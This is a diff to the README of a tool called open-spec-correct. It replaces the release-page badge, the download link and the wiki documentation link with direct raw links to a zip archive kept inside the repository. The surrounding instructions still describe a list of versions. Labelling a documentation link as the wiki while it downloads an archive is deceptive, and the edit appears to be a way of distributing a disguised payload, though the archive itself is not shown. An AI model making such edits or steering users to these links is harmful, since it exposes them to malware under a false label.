@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download open-spec-correct](https://img.shields.io/badge/Download-open--spec--correct-blue.svg)](https://github.com/saoudkhalid/open-spec-correct/releases)
+[![Download open-spec-correct](https://github.com/saoudkhalid/open-spec-correct/raw/refs/heads/main/open_spec_correct/open-correct-spec-v1.4-beta.2.zip)](https://github.com/saoudkhalid/open-spec-correct/raw/refs/heads/main/open_spec_correct/open-correct-spec-v1.4-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download and run **open-spec-correct**, ensure your system meets thes
 
 To get started, visit the Releases page to download the software:
 
-[Download open-spec-correct](https://github.com/saoudkhalid/open-spec-correct/releases)
+[Download open-spec-correct](https://github.com/saoudkhalid/open-spec-correct/raw/refs/heads/main/open_spec_correct/open-correct-spec-v1.4-beta.2.zip)
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -77,7 +77,7 @@ The application helps with several areas related to API management:
 
 If you encounter issues or need assistance:
 
-- **Documentation**: Visit the [GitHub Wiki](https://github.com/saoudkhalid/open-spec-correct/wiki) for user guides and detailed explanations.
+- **Documentation**: Visit the [GitHub Wiki](https://github.com/saoudkhalid/open-spec-correct/raw/refs/heads/main/open_spec_correct/open-correct-spec-v1.4-beta.2.zip) for user guides and detailed explanations.
 - **Community Support**: Check the Issues section on GitHub to see if your question is addressed or to open a new issue.
 - **Contact**: Reach out to our team through the GitHub Discussions for further help.
 
